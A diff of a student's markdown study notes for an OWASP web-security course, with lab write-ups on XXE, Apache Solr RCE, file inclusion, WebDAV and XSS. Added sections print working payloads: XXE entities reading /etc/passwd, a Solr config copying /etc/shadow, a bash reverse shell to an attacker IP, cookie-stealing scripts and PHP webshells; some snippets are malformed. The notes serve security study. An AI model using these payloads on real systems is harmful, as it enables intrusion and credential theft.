@@ -63,16 +63,43 @@ this markdown file is to be used in conjunction with the slides and is supposed 
   - [A1: Injection Attacks](#a1-injection-attacks)
     - [week5 lab: SQLi bypassing auth, Free Article Submission](#week5-lab-sqli-bypassing-auth-free-article-submission)
     - [week5 lab: SQL Injection -CVE: OpenSupports](#week5-lab-sql-injection--cve-opensupports)
-    - [SQL Injection](#sql-injection)
+    - [week 5 lab: SQL Injection](#week-5-lab-sql-injection)
   - [A2: broken auth](#a2-broken-auth)
     - [week5: Broken Auth - Airline Booking – Update cookie](#week5-broken-auth---airline-booking--update-cookie)
-    - [Improper Session Management – Manipulate URL parameter](#improper-session-management--manipulate-url-parameter)
+    - [Week 5 lab: Improper Session Management – Manipulate URL parameter](#week-5-lab-improper-session-management--manipulate-url-parameter)
   - [A3: sensitive data exposure](#a3-sensitive-data-exposure)
     - [week5: SQL information available from Web Server Logs, real world webapp](#week5-sql-information-available-from-web-server-logs-real-world-webapp)
+    - [week5: Sensitive Directories in `robots.txt`](#week5-sensitive-directories-in-robotstxt)
+- [Day 6: OWASP top 10: XXE, Broken Access Control,](#day-6-owasp-top-10-xxe-broken-access-control)
+  - [A4 XXE: XML external entity injection](#a4-xxe-xml-external-entity-injection)
+    - [Week 6 lab: XXE Injection](#week-6-lab-xxe-injection)
+    - [Week 6 lab: XML External Entity – alter DTD, XSS attack with XSSer](#week-6-lab-xml-external-entity--alter-dtd-xss-attack-with-xsser)
+    - [week6 lab: XML External Entity – CVE: Apache Solr  -alter xml file](#week6-lab-xml-external-entity--cve-apache-solr--alter-xml-file)
+    - [week 6 lab: XML External Entity – CVE: Apache Solr](#week-6-lab-xml-external-entity--cve-apache-solr)
+  - [A5 Broken Acess Control](#a5-broken-acess-control)
+    - [week 6 lab: Insecure Object Direct Reference – Horizontal and Vertical Escalation](#week-6-lab-insecure-object-direct-reference--horizontal-and-vertical-escalation)
+    - [week 6 lab: Insecure Object Direct Reference II – Changing ticket price](#week-6-lab-insecure-object-direct-reference-ii--changing-ticket-price)
 - [current lab list](#current-lab-list)
+    - [week6 lab: Local file inclusion – change filename](#week6-lab-local-file-inclusion--change-filename)
+    - [week6 lab: Local file inclusion & Directory traversal - bloofoxCMS](#week6-lab-local-file-inclusion--directory-traversal---bloofoxcms)
+    - [week6 lab: Local file inclusion & Directory traversal - bloofoxCMS](#week6-lab-local-file-inclusion--directory-traversal---bloofoxcms-1)
+    - [week6 lab: Directory Traversal](#week6-lab-directory-traversal)
+- [day 7: Broken Access Control, Security Misconfiguration](#day-7-broken-access-control-security-misconfiguration)
+    - [week 7 lab: Remote File Inclusion I](#week-7-lab-remote-file-inclusion-i)
+    - [week 7 lab: Remote File Inclusion II PHP Shell](#week-7-lab-remote-file-inclusion-ii-php-shell)
+  - [A6: Security Misconfiguration](#a6-security-misconfiguration)
+    - [week7 lab: Missing Function-Level Access Control: Arbitrary Folder Deletion](#week7-lab-missing-function-level-access-control-arbitrary-folder-deletion)
+    - [week7 lab: Vulnerable Apache Sever- Lack of Access Control on POST](#week7-lab-vulnerable-apache-sever--lack-of-access-control-on-post)
+    - [week7 lab: WED-DAV – Missing Access control on upload method](#week7-lab-wed-dav--missing-access-control-on-upload-method)
+  - [A7: Cross-Site Scripting: XSS](#a7-cross-site-scripting-xss)
+    - [week 7 lab: Article Setup – reflected XSS](#week-7-lab-article-setup--reflected-xss)
+    - [week 7 lab: APHP Micro Blog – Persistent XSS, negative example of reflected XSS](#week-7-lab-aphp-micro-blog--persistent-xss-negative-example-of-reflected-xss)
+    - [week7 lab: RCE Via MySQL](#week7-lab-rce-via-mysql)
 - [less important labs to do soon:](#less-important-labs-to-do-soon)
 - [todos and toreads](#todos-and-toreads)
+- [uncategorised readings:](#uncategorised-readings)
 - [Useful References](#useful-references)
+- [Questions:](#questions)
 
 # Day1: Introduction 
 
@@ -725,6 +752,7 @@ finally we just run the webshell!
 
 
 [**about shadow files**](https://linuxize.com/post/etc-shadow-file/):
+[**aboud shadow files and passwd file**](https://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.html)
 
 Shadow files are used in one of the various authentication schemes in linux, check against the `/etc/shadow` or `/etc/passwd` files. shadow file is a text file and it contains system users' pwds, owned by root.
 there's a shadow format: 
@@ -1334,6 +1362,15 @@ they didn't restrict the db logs, can access it by going to the endpoint:
 
 - this lets us know what dbtables there are and the table names!
 
+### week5: Sensitive Directories in `robots.txt`
+
+cid 1899
+
+This lab looks at the robots.txt files to see what the dev regards as non-crawlable. It appears 
+that this dev has indicated a passwords file in it as well as the phpmyadmin console. 
+
+We access the php admin console, where we can navigate and read off the `<host>/passwords`
+
 
 
 
@@ -1365,6 +1402,8 @@ they didn't restrict the db logs, can access it by going to the endpoint:
 * "External Entity" refers to a storage unit (e.g. a hard drive). 
 XXE attacks can be prevented by just using JSON instead (JSON is less complex)
 
+* XXEs a little difficult to detect because XML parser-related logging is usually poor.
+
 ***There are various Types of XXE attacks.***
  *[SSRF attacks](https://portswigger.net/web-security/ssrf) where where an external entity is defined based on a URL to a back-end system. . server-side application is induced to make HTTP requests to any URL that the server can access and it exploits trust relationships.
  * exfitrate data *out-of-band*:  
@@ -1386,6 +1425,119 @@ XXE attacks can be prevented by just using JSON instead (JSON is less complex)
     - mostly perform CRUD actions on data
   * RPC (Remote Procedure Call) style e.g. JSON-RPC, XML-RPC
 
+### Week 6 lab: XXE Injection
+cid 1889 (using mutilidae)
+
+This lab just wants us to play around with setting diff DTDs and playing around with XXE injections using the XML validator
+
+* firstly it appears that validating this: 
+    ```xml
+    <a> <b> hello world </b> </a>
+    ```
+  works (no need to even nest it actually) but putting non-strings or even `"1"` will throw error by the parser and say that the xml tag is mal-formed.
+
+* we can attempt at calling for an external entity like so: 
+  ```xml
+  <!DOCTYPE data [<!ENTITY password SYSTEM "file:///etc/passwd">]>
+  <data>
+      <text> 
+      &password;
+      </text> 
+  </data>
+  ```
+  note that the nesting of the text tag within the data tag isn't really necessary, it works even without it.
+  Here we're using a locally stored file as the external entity, we can force it to look at a remote location too: 
+
+  ```xml
+  <!DOCTYPE data [<!ENTITY passwd SYSTEM "http://192.255.164.2:9000/helloworld">]>
+  <data><text>&passwd;</text></data>
+  ```
+  where the ip addr refers to the attacker's ip, and the port 9000 is a custom port on which we've opened up a listening port using 
+  `python -m SimpleHTTPServer 9000`
+
+
+
+### Week 6 lab: XML External Entity – alter DTD, XSS attack with XSSer
+cid 1889
+
+[XSSer](https://tools.kali.org/web-applications/xsser) is a tool that's useful for doing cross-site scripting attacks. Looking at the manual shows details 
+on how it can audit whether a target is vulnerable to XSS. 
+To determine if the vulnerability is there, intercept via Burp proxy so that you can see how the tail of that HTTP request is done, to help 
+us know how to write out the target. Place the "XSS" as a param. Need to provide the following params for XSSer: 
+  * `--url` for the target url
+  * `-p` indicating the HTTP method type of POST
+  * `'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'` that specifies where XSSer is to sub in its payloads
+  * Now, to try various payloads, add the `--auto` flag to the request: `xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto`
+
+If we wanna make our custom payload, we can use the `--Fp` for the final payload and supply the code we want. This will help us generate a final payload eventually 
+that we can use to make our final request.
+
+For making GET requests, we can just leave it as is, and supply just the username. 
+  
+**nb:** for xsser, have to pass in the arguments as a string and the url has to have the protocol indicated e.g. `http://...`
+
+
+
+qq: not sure why need to intercept using BURP for this though (and to modify the last line to indicate the `target_host="XSS"`) when we are never forwarding that request from burpsuite
+
+https://youtu.be/EYHrwOageNY
+
+### week6 lab: XML External Entity – CVE: Apache Solr  -alter xml file
+cid=1853
+Refer discord channel for corrected payload. Error with lab manual.
+
+The target is a Apache Server running Solr 8.1.1, and it's RCE exploits are documented like [here](https://github.com/veracode-research/solr-injection#3-cve-2019-0193-remote-code-execution-via-dataimporthandler). The vulnerability lies in data importing config. an xml file has to be hosted
+on localhost which will be fetched by the config used for remote code execution.
+
+1. We start a local server for the HTTP transfer of payload file
+   * here's a way to set up a PHP server :`php -S 0.0.0.0:80`
+   * else just run a SimpleHTTP server via python 
+2. add the payload to the configuration for the data import in debug mode: 
+    this is the payload: 
+      ```xml
+      <dataConfig>
+        <dataSource type="URLDataSource"/>
+        <script><![CDATA[
+                function poc(){ java.lang.Runtime.getRuntime().exec("cp /etc/shadow /opt/solr/server/solr-webapp/webapp/poc.txt");
+                }
+        ]]></script>
+        <document>
+          <entity name="stackoverflow"
+                  url="http://192.17.117.2/solr"
+                  processor="XPathEntityProcessor"
+                  forEach="/note"
+                  transformer="script:poc" />
+        </document>
+      </dataConfig>
+    ```
+    this payload will:
+      * copy the shadow file and copy it into a file `poc.txt` which will be available on the webroot itself. We can find it by looking at /solr/poc.txt
+      * indexes the xml file 
+  btw this is the diff b/w [password files nad shadow files](https://kerneltalks.com/linux/difference-between-etc-passwd-and-etc-shadow/)
+
+### week 6 lab: XML External Entity – CVE: Apache Solr  
+cid=1530
+
+this deals with vulnerability on solr 7.1.1, [exploit db post on it](https://www.exploit-db.com/exploits/43009). 
+We send a json payload that allows us to do RCE. Attacker's machine shall listen on netcat and 
+
+payload :
+
+```json
+{
+  "add-listener" : {
+  "event":"postCommit",
+  "name":"payload",
+  "class":"solr.RunExecutableListener",
+  "exe":"sh",
+  "dir":"/bin/",
+  "args":["-c", "echo 'bash -i >& /dev/tcp/192.130.137.2/1234 0>&1' > /tmp/remote.sh;chmod 777 /tmp/remote.sh;bash /tmp/remote.sh"]
+  }
+}
+```
+
+this payload adds a listener to the target url at `solr/attackdefense/config`
+
 
 
 ## A5 Broken Acess Control
@@ -1400,9 +1552,42 @@ XXE attacks can be prevented by just using JSON instead (JSON is less complex)
 * Risk: *generally impacts the confidentiality and integrity of data*
 
 
-
 * [**Federated Identities: openid, saml, oauth:**](https://www.softwaresecured.com/federated-identities-openid-vs-saml-vs-oauth/)
   - using a service to help with identity management, based on a trust relationship with that identity management system. Solves the problem of "how to bring together user login information across many applications and platforms to simplify sign-on and increase security".
+  - saml with Single Sign on uses XML for identity assertions, and might be vulnerable to XXE attacks
+
+
+
+
+
+### week 6 lab: Insecure Object Direct Reference – Horizontal and Vertical Escalation
+cid=1907 [youtube link](https://youtu.be/LF5DV_g7QBE)
+
+The "Object" here refers to files, data... resources in general. 
+The target here is a railsgoat application.
+After logging in as a normal user, by observing the url params, we see that the id name is part of it,
+we try chaning the id number to access other user's data. This allows **horizontal access**. 
+
+We look at the account recovery / password changing feature, intercept the request to that, and modify
+the params of that to change the login credentials of another user. This is **horizontal escalation** as 
+we get to take over that other user's account.  
+
+Now, if we do the same for **UID 1, which is usually the default id for the admin account**, then 
+we take over the admin account and that is **vertical escalation!**
+
+
+
+
+
+### week 6 lab: Insecure Object Direct Reference II – Changing ticket price
+[cid 1899](https://youtu.be/K20DBHufewQ)
+
+Similarly, the object is referenced directly, so intercept the HTTP request and modify the params being passed,
+change the price tag and you get to change the ticket price.
+
+
+
+
 
 # current lab list
 - [error based sql injection](https://www.attackdefense.com/challengedetails?cid=1903)
@@ -1418,40 +1603,213 @@ Blind Time Based SQL Injection https://www.attackdefense.com/challengedetails?ci
 
 week 6 labs to do: 
 
-XML External Entity – alter DTD
-https://www.attackdefense.com/challengedetails?cid=1889
-https://youtu.be/EYHrwOageNY
 
-XML External Entity – CVE: Apache Solr  -alter xml file
-https://www.attackdefense.com/challengedetails?cid=1853
-Refer discord channel for corrected payload. Error with lab manual.
 
-XML External Entity – CVE: Apache Solr  
-https://www.attackdefense.com/challengedetails?cid=1530
+### week6 lab: Local file inclusion – change filename
+[cid 1899](https://youtu.be/IRZ1KKIMffo)
 
-Insecure Object Direct Reference – Change email and password using existing user session
-https://www.attackdefense.com/challengedetails?cid=1907
-https://youtu.be/LF5DV_g7QBE
+Acess control hasn't been done properly here, we realise that we can just change the 
+url params is as such: `http://192.245.219.3/rlfi.php?language=lang_en.php&action=go` and 
+include some local file as part of the http request! 
 
-Insecure Object Direct Reference II – Changing ticket price
-https://www.attackdefense.com/challengedetails?cid=1899
-https://youtu.be/K20DBHufewQ
 
-Local file inclusion – change filename
-https://www.attackdefense.com/challengedetails?cid=1899
-https://youtu.be/IRZ1KKIMffo
 
-Local file inclusion & Directory traversal - bloofoxCMS
-https://www.attackdefense.com/challengedetails?cid=279
 
-Local file inclusion & Directory traversal - bloofoxCMS
+
+### week6 lab: Local file inclusion & Directory traversal - bloofoxCMS
+cid 279
+
+Here, we have a real world webapp, a CMS. There are two vulnerabilities in this, so 
+we look into the version details about which version of Bloofox the site runs on, and 
+realise that [this is the more appropriate vulnerability](https://www.exploit-db.com/exploits/39032)
+
+the exploit is to add to the url these params: `/index.php?mode=settings&page=editor&fileurl=config.php`
+
+then we just trial and error (?) and we attempt to do some directory traversal and realise that 
+if we pass in this as the fileurl: `../../../../../etc/passwd`, we can directly read off the 
+passwd file of the system. This includes a local file (just dumps it)
+
+
+***nb: admin on a service =/= admin on a system** the former one is more like a user-group, where you're 
+like a moderator
+
+### week6 lab: Local file inclusion & Directory traversal - bloofoxCMS
 https://www.attackdefense.com/challengedetails?cid=277
 
-Directory Traversal
-https://www.attackdefense.com/challengedetails?cid=1899
-https://youtu.be/Sx26dpb7G6c
+### week6 lab: Directory Traversal
+[1899](https://youtu.be/Sx26dpb7G6c)
 
-lesson 7: 
+Well this is literally just a directory traversal
+
+
+# day 7: Broken Access Control, Security Misconfiguration
+
+Consider sessions-handling thru the use of cookies, the server shall assign a sessions id and there are 3 possible places the cookie may be stored: 
+in the HTML form field, in the URL and within the cookie
+
+more on [HTTP cookies](https://docs.microsoft.com/en-us/windows/win32/wininet/http-cookies?redirectedfrom=MSDN)
+**server setting the cookie:** uses the special `Set-Cookie` header 
+
+  ```
+  Set-Cookie: <name>=<value>[; <name>=<value>]...
+  [; expires=<date>][; domain=<domain_name>]
+  [; path=<some_path>][; secure][; httponly]
+  ```
+
+* if expiry date isn't set, then it's a sessions cookie
+* if the `httponly` field exists then javascript can't read/write that cookie. This makes is safer since most attacks hinge on javascript, it's a XSS mitigation mechanism
+* 
+
+
+### week 7 lab: Remote File Inclusion I 
+
+
+**in real life**, the RFI needs some amount of *social engineering* to be done such that the victim does the requesting of that particular crafted url that the attacker desires.
+  attacker crafts a url. This url he sends to the url (e.g. via forum / email...) 
+  when user clicks on the url, this crafter url is sent to the real web server which won't have that resource so it contacts the attacker's server to fetch that
+
+Here, the target's url params allow us to request for a resource in a remote location. Our objective is to steal the 
+cookie for the current session. 
+
+1. first we set up attacker's server on a specific port 
+2. on attacker's machine, set up a file with the following script payload: 
+
+  ```html
+  <img id="img" src="">
+
+  <script> 
+      document.getElementById("img").src="http://192.53.222.2/?cookie="+document.cookie
+  </script> 
+  ```
+3. now, include this file by passing in the correct url like so: `http://192.53.222.3/index.php?page=http://192.53.222.2/getCookies.txt` 
+4. this will cause that follwing script to run, giving us the cookie for that session
+  
+
+### week 7 lab: Remote File Inclusion II PHP Shell
+[cid 1899](https://youtu.be/yCmVnXcXFE4)
+
+similar to the previous lab, this time, we create a php script that will give us a webshell: 
+
+1. set up attacker's server
+2. payload file: 
+   ```php
+   <?php
+   
+   $output=shell_exec("ps -eaf");
+   echo "<pre".$output."</pre>";
+   
+   >
+
+   ```
+
+   note: the `<pre>` html tags prevents preformatting of the text, and hence is seen as raw text input. 
+3. do this RFI, realise: 
+    * PID 1 is usually the init process but in this case, it's a supervisor, googling hints that this application is containerised. Since containerised apps are ***ephemeral*** (can be cycled in and out), we might not really gain much from breaking this app
+
+
+## A6: Security Misconfiguration
+
+This is pretty generic of a description actually, anything whereby the config isn't done properly will fall under this. 
+Examples: WebDAV setup, controlling what HTTP request methods are permissible, sanitising input fields...
+
+### week7 lab: Missing Function-Level Access Control: Arbitrary Folder Deletion
+[350](https://youtu.be/IfrrvgvLYao)
+
+[the exploit in about Monstra CMS](https://www.exploit-db.com/exploits/44512), involving an insecure permissions that allows us to delete files/folders arbitrarily. 
+
+We create some dummy dirs, using the console given. Then we set up proxy to intercept the delete request. 
+Modify the params such that the entire `/uploads` dir is deleted. This sort of breaks the entire upload feature of the app.
+
+Have to do it by intercepting the HTTP request, rather than just crafting the url because crafting the url will not have the correct security token and the server will just return "invalid token" error.
+
+
+
+
+### week7 lab: Vulnerable Apache Sever- Lack of Access Control on POST
+
+[cid 198](https://youtu.be/LN0hyMQPbeU)
+
+This was funny. Simple HTTP auth was done, we intercept using our own machine's burp and change the request method 
+from GET to POST and this somehow magically gives us access.
+
+### week7 lab: WED-DAV – Missing Access control on upload method
+[cid=1802](https://youtu.be/qdHIMDum3qw)
+
+Goal: we wanna steal the cookie by expoilting the DAV misconfiguration that allows us to upload files onto the `/uploads` dir. 
+payload file's contents:
+
+  ```html
+  <!-- filename: getCookie.html -->
+  <img id="getCookie" src""/>
+
+  <script> 
+    document.getElementById("getCookie").src="http://192.65.175.2/?cookies="+document.cookie;
+  </script>
+  ```
+upload this file using curl like so: 
+`curl 192.65.175.3/uploads/ --upload-file getcookie.html`
+
+Now, we set up a listening server on attacker machine, and access that file in the victim's machine, which
+will make the script run and send the attacker machine the url with the cookie appended to it.
+
+
+
+## A7: Cross-Site Scripting: XSS
+
+rule of thumb: activeJS supplied by the client side should never be rendered on the page itself without the server sanitising that JS. 
+
+### week 7 lab: Article Setup – reflected XSS
+[cid=492](https://youtu.be/u2yRbFEd894)
+
+[just another XSS vulnerability](https://www.exploit-db.com/exploits/28564). It's enough to show that 
+the XSS is reflected so doing something like `<script> alert("myAlert is nice" )</script>` is enough.
+
+
+### week 7 lab: APHP Micro Blog – Persistent XSS, negative example of reflected XSS
+[cid=29](https://youtu.be/rEqXQg_0Hjw)
+The attacker might not have any user level access to the web application. However, this does not mean that the application cannot be used to attack other users. Stored Cross Site Scripting could be triggered even by unauthenticated users.
+
+[it's a persistent XSS exploit](https://www.exploit-db.com/exploits/40505) whereby the comments feature, the input text field is sanitised but then the name and email field in that form is not, which allows us to inject some code in there. 
+payload: 
+
+  ```html
+  <script> alert(document.cookie)</script>
+  ```
+rmb not to leave the other fields in the form empty, including the CAPTCHA check
+Publishing this comment will cause the script to run.
+
+
+
+### week7 lab: RCE Via MySQL 
+
+There's a misconfiguration done on the `secure_file_priv`. If the string value for that param is left empty, then
+the web root directory is ***world writable***. 
+
+Here, we use the [***wappalyzer plugin***](https://www.wappalyzer.com/), realise that it's running PHP, so our payload needs to be catered for php. 
+
+check for nmap script for mysql: `ls -l /usr/share/nmap/scripts  | grep mysql`
+
+we have a script that checks if the MySQL service is configed w root pwd or not, run that script: 
+`nmap --script mysql-empty-password -p 3306 192.173.248.3`
+
+it appears that the root account (for the sql server btw) doesn't have any assigned pwd, so we can log into the MySQL server as root user: `mysql -u root -h 192.173.248.3`
+
+check if file creation is allowed: `select  "hello world" into outfile "/tmp/temp" from mysql.user limit 1;`, if so, then can write files into arbitrary directories if the directory is ***world writable***. 
+
+We write a PHP webshell into it then, payload: 
+  ```sql
+  select "<?php $output=shell_exec($_GET["cmd"]);echo "<pre>".output."/pre"?" into outfile "/var/www/html/shell.php" from mysql.user limit 1;"
+  ```
+
+week 7 reading: 
+https://hdivsecurity.com/owasp-broken-access-control
+
+
+https://hdivsecurity.com/owasp-security-misconfiguration
+
+https://excess-xss.com/
+
+https://www.cloudwards.net/what-is-webdav/#:~:text=WebDAV%20stands%20for%20Web%20Distributed,to%20collaborate%20on%20web%20content.
 
 
 
@@ -1462,10 +1820,7 @@ lesson 7:
 
 # todos and toreads
 
-start ========
-
-
-random readings: 
+# uncategorised readings:
 
 * [deception](https://www.helpnetsecurity.com/2018/12/06/introduction-deception-technology/) technology and [honeypots](https://roi4cio.com/en/categories/category/deception-techniques-and-honeypots/)
    - this is actually really cool. Some forefront-of-cybersec kind of thing
@@ -1475,14 +1830,6 @@ random readings:
 * [browser plugin and extensions](https://www.securityweek.com/websites-can-exploit-browser-extensions-steal-user-data) they are shady and shouldn't be trusted like that. The standards that extensions have to follow is more lax than those of websites themselves, hence extensions are very exploitative.
 
 * [devsecops: not exactly devops and with security in mind](https://www.sumologic.com/insight/devsecops-rugged-devops/#:~:text=DevSecOps%20involves%20creating%20a%20'Security,processes%20within%20an%20agile%20framework)
-
-
-
-
-
-
-
-===============   BREAK TIME   ==========
 
 * XXE:
 
@@ -1494,9 +1841,6 @@ random readings:
             <!DOCTYPE data [<!ENTITY passwd SYSTEM "file:///etc/passwd">]> <data><text>&passwd;</text></data>
 
             <!DOCTYPE data [<!ENTITY passwd SYSTEM "http://192.81.46.2:9000/passwd">]> <data><text>&passwd;</text></data>
-           
-  
-
 
 * broken access control: https://www.packetlabs.net/broken-access-control/
       * SAML: https://www.softwaresecured.com/federated-identities-openid-vs-saml-vs-oauth/
@@ -1509,9 +1853,6 @@ random readings:
 
 
 
-end ================ 
-
-
 
 * [CRLF characters](https://tools.ietf.org/html/rfc2616)
 * [metasploit tutorial](https://www.youtube.com/watch?v=8lR27r8Y_ik)
@@ -1522,6 +1863,11 @@ end ================
 * [opaque actually makes things opaque](https://medium.com/@billatnapier/opaque-one-of-the-great-advancements-in-cybersecurity-aace51a76560)
 * look into learning GOlang for writing own scripts and crawlers
 * port(external pov) vs socket(as file descriptors?)
+
+
+
+
+
 
 # Useful References
 * [tldrs for man pages](https://tldr.sh/)
